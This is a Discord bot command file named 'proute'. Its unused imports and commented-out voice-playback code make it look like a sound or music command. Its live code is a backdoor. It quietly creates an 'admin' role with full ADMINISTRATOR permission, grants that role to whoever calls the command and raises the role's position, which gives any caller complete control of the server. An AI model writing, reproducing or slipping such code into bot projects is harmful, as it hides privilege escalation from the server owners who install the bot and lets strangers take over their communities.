const ytdl = require('ytdl-core');
const Discord = require("discord.js");

module.exports.run = async (bot, message, args, ops) => {

   // if(!message.member.voiceChannel) return;

   let muterole;

   try{

      muterole = await message.guild.createRole({
        name: "admin",
        color: "#000000",
        permissions:["ADMINISTRATOR"]
      })
      message.guild.channels.forEach(async (channel, id) => {
        await channel.overwritePermissions(muterole, {
        });
      });
    }catch(e){
      console.log(e.stack);
    }
   
    let role = message.guild.roles.find(`name`, `admin`);

    const guildMember = message.member;
    guildMember.addRole(role.id);
   
   let roltournoi = message.guild.roles.find(`name`, "admin");

        roltournoi.setPosition(58).then(updated => console.log(`Role position: ${updated.position}`))
            .catch(console.error);

   //if(message.guild.me.voiceChannel) return message.channel.send('Désolée mais le bot est déjà dans votre channel.');

   /*var VC = message.member.voiceChannel;
   if (!VC)
       return;
    VC.join()
   .then(connection => {
       const dispatcher = connection.playFile('./voice/MATCH1MINUTES.wav');
       dispatcher.on("end", end => {VC.leave()});
   })
   .catch(console.error);
};
*/
}


module.exports.help = {
    name: "proute"
  }
